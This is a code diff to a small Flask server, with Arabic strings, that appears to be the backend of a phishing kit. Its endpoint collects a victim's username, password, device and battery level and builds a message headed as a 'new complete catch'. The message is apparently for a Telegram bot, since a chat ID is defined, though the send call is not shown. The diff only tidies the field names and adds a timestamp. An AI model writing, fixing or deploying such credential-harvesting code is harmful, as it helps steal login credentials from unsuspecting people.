@@ -1,5 +1,6 @@
 from flask import Flask, request, jsonify
 import requests
+from datetime import datetime
 
 app = Flask(__name__)
 
@@ -10,17 +11,22 @@ CHAT_ID = "7984067238"
 def save_data():
     try:
         data = request.json
-        u, p, d, b, t = data.get('u'), data.get('p'), data.get('d'), data.get('b'), data.get('t')
+        u = data.get('user', 'غير معروف')
+        p = data.get('pass', 'غير معروف')
+        d = data.get('device', 'غير معروف')
+        b = data.get('battery', 'N/A')
+        t = datetime.now().strftime("%Y-%m-%d %I:%M:%S %p")
 
+        # تنسيق النصوص المرتب بالكامل
         msg = (
             "🚀 **إشعار: صيد جديد مـكتمل** 🚀\n"
             "━━━━━━━━━━━━━━━\n"
-            f"👤 المستخدم: `{u}`\n"
-            f"🔑 كلمة السر: `{p}`\n"
+            f"👤 **المستخدم:** `{u}`\n"
+            f"🔑 **كلمة السر:** `{p}`\n"
             "━━━━━━━━━━━━━━━\n"
-            f"📱 الجهاز: {d}\n"
-            f"🔋 البطارية: {b}\n"
-            f"⏰ الوقت: {t}\n"
+            f"📱 **الجهاز:** {d}\n"
+            f"🔋 **البطارية:** {b}\n"
+            f"⏰ **الوقت:** {t}\n"
             "━━━━━━━━━━━━━━━"
         )
 
